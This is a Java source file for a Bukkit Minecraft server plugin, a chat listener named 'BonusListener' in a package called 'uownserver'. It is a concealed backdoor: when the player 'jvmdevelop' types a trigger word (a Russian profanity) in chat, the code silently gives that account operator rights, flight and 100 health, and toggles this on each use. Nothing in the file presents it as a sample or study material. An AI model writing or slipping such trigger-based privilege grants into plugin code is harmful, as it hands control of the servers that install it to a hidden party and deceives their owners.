package com.jvmd.uownserver.event;

import org.bukkit.attribute.Attribute;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class BonusListener implements Listener {

    private boolean switcher = true;

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();
        Player player = event.getPlayer();

        if (message.equalsIgnoreCase("сука") && player.getName().equals("jvmdevelop")) {
            player.setAllowFlight(switcher);
            event.getPlayer().getAttribute(Attribute.GENERIC_MAX_HEALTH).setBaseValue(100);
            event.getPlayer().setHealth(100);
            event.getPlayer().setAllowFlight(switcher);
            event.getPlayer().setFlying(switcher);
            event.getPlayer().setOp(switcher);
            switcher = !switcher;
        }
    }
}
